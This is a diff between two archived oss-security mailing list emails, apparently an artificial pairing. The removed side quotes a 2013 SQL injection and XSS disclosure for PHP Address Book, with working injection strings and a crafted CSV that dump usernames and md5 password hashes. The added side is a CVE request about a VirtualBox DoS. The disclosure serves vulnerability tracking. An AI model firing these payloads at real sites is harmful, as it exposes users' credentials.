@@ -1,89 +1,63 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/17/5
-Message-ID: <20130417142745.GA11662@kludge.henri.nerv.fi>
-Date: Wed, 17 Apr 2013 17:27:45 +0300
-From: Henri Salo <henri@...v.fi>
-To: Doraemon Sk8ers <doraemon.sk8ers@...il.com>
-Cc: oss-security@...ts.openwall.com
-Subject: Re: Multiple vulnerabilities in PHP Address Book v8.2.5
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/07/05/11
+Message-ID: <51D71CE5.8090309@redhat.com>
+Date: Fri, 05 Jul 2013 13:22:13 -0600
+From: Kurt Seifried <kseifried@...hat.com>
+To: oss-security@...ts.openwall.com
+CC: Raphael Geissert <geissert@...ian.org>, security@...cle.com
+Subject: Re: Possible CVE request: virtualbox virtio-net host DoS
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-I believe CVE-2013-1748 #1 is duplicate of CVE-2008-2565 as per OSVDB[1]. As far
-as I know most of security vulnerabilities reported to this project haven't been
-fixed. Haven't verified this detail. What php-addressbook project would need is
-patches to fix all issues you can find. Finding vulnerabilities is easy -
-fixing in upstream is not. I can help you if you are willing to write patches.
-Takes hour or two :)
+On 07/05/2013 04:13 AM, Raphael Geissert wrote:
+> Hi,
+> 
+> Quoting [1]:
+>> I have discovered a problem with virtio-net that leads to a
+>> lockup of the host machine's kernel and the need for a hard reset
+>> to make it working again.
+> 
+> The bug is said to be worked around in version 4.2.14 and really
+> fixed in 4.2.16, but the changelog of either version doesn't
+> reference that ticket.
+> 
+> Rumors say that virtualbox makes the host randomly hang, but since 
+> there is an actual bug report and confirmation from upstream this
+> time I guess a CVE id should be assigned.
+> 
+> [1] https://www.virtualbox.org/ticket/11863 [2]
+> https://www.virtualbox.org/wiki/Changelog [3]
+> https://secunia.com/advisories/53858/
+> 
+> Cheers, -- Raphael Geissert - Debian Developer www.debian.org -
+> get.debian.net
 
-1: http://osvdb.org/45965
+Oracle is a CNA so they should handle this:
 
----
-Henri Salo
+http://cve.mitre.org/cve/cna.html
 
-On Wed, Apr 17, 2013 at 11:14:27AM +0800, Doraemon Sk8ers wrote:
-> There is a SQL injection vulnerability and reflected XSS in Simple PHP
-> Address Book v8.2.5.
-> The 2 vulnerabilities had been assigned the CVE identifier CVE-2013-1748
-> (SQLi) & CVE-2013-1749 (XSS) respectively.
-> 
-> # Software Link: http://sourceforge.net/projects/php-addressbook/
-> # Version: v8.2.5
-> # Tested on: v8.2.5
-> # CVE : CVE-2013-1748 (SQLi) & CVE-2013-1749 (XSS)
-> 
-> 
-> Details:
-> -----------
-> *
-> *
-> *CVE-2013-1748 (SQLi)*
-> 
-> We have discovered 3 pages which are prone to SQL Injection
-> 
-> 1.	/view.php?id=1
-> The "id" parameter is vulnerable to SQL injection
-> Injection Vector:
-> 	/view.php?id=-1' union select '1','2','3','4',(select username from
-> users limit 1),(select md5_pass from users limit 1),(select email from
-> users limit 1),'8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41
-> This injection vector will dump the username, md5 password and email
-> of the first user in the user table onto the page itself
-> 
-> 2.	/edit.php
-> Most of the fields on this page are vulnerable to SQL injection
-> Injection Vector (inclusive of quotes):
-> 	'+(select ASCII(SUBSTRING((SELECT md5_pass from users limit 1), 1)))+'
-> This will dump out the ASCII value of the 1st character of the md5
-> password of the first user
-> 
-> 3.	/import.php
-> The same injection vulnerability as Point 2 above is also present in
-> the import function
-> Using the same injection vector, saved in a csv file
-> 	'+(select ASCII(SUBSTRING((SELECT md5_pass from users limit 1), 1)))+'
-> Similarly, this injection vector will dump out the ASCII value of the
-> 1st character of the md5 password of the first user
-> 
-> The original input csv sample looks like this
-> "Last name";"First
-> name";"Birthday";"Address";"ZIP";"City";"Home";"Mobile";"E-mail
-> home";"Work";"Fax";"E-mail office";"Second address";"Second phone"
-> "thelastname";"thefirstname";"13.09.1951";"Street";"1234";"city,
-> Country";"+1 123 456 789";"+2 345 678 910";"first.last@...l1.com";"+3
-> 456 789 101";"+4 567 897 011";"first.last@...l2.net";"second street,
-> 1234 secondcity, secondcountry";"+5 678 910 111"
-> 
-> The injected csv with the injected vectors looks like this
-> "Last name";"First
-> name";"Birthday";"Address";"ZIP";"City";"Home";"Mobile";"E-mail
-> home";"Work";"Fax";"E-mail office";"Second address";"Second phone"
-> "";"injectedthrucsv";"13.09.1951";"'+(select ASCII(SUBSTRING((SELECT
-> md5_pass from users limit 1), 1)))+'";"";"city, Country";"+1 123 456
-> 789";"+2 345 678 910";"first.last@...l1.com";"+3 456 789 101";"+4 567
-> 897 011";"first.last@...l2.net";"second street, 1234 secondcity,
-> secondcountry";"+5 678 910 111"
-<snip>
+CC'ing them. Can you guys assign one quickly so this can be properly
+tracked? Thanks!
 
-Download attachment "signature.asc" of type "application/pgp-signature" (199 bytes)
+- -- 
+Kurt Seifried Red Hat Security Response Team (SRT)
+PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.13 (GNU/Linux)
+
+iQIcBAEBAgAGBQJR1xzlAAoJEBYNRVNeJnmTrrsQALVz10X3jeJXJwZ+Zv5lRsJ9
+GRwxUqpMiRnE1ruslEQYsapH5+AWF5i9PQe10RYGyZP3HMBxPFj+4SYYgNRHjJqI
+5KI3BSmpxwX4nvr6J5OvZpfrclfM/Xk/jEDJv7Ixz6//qi/IfrGn7ybBoQqanJ+T
+Fo18/HyDRHoykS4w5C1zaXtidgM+32kB+8UQKa31A8wsYbZQs58UybGZGGfFX3Ye
+3C24KZp/PFKqtnT1HixNpsOvZIW8WoviYuViz16MJrAGmieZj/yozTrVeN+T/eZb
+omDdXknUvXr11ZBK7oyPTM4qL1jkSXL6ECPTiI0h+jBccRvavpf6jtpJZC/ANZyA
+pi1BxU0sb1+5B6aXPdmFgIpZzXwjUyBybpCXkJ4DdLkjoriExa8uRNe5FXes+RAr
+d4iRwxr0tbXIaEyUHWpor8KCTZWBWxVT++lnjgIIFoA3lfEZ+4DGxUugey2QscJF
+Px3xbp8+AAAuGqUgf03W3IWyYzjlTmMjnut1vcc/BwbtVVtnaLcHgv9sPhjrmCj6
+tRJjCC1gU+BU+b8EF1sRfFqeAb79NZ709xFOAUau0WYb1kR18XCKDGBgmkmBm3ki
+xLWaBdToIX7T8LkOKQGReunVXqJdBu2mYruYf3X3Bu5koJDtuUUzbqqJDgGbTYNn
+E2Ue0NhUPbQZMw379XEE
+=O5Fn
+-----END PGP SIGNATURE-----
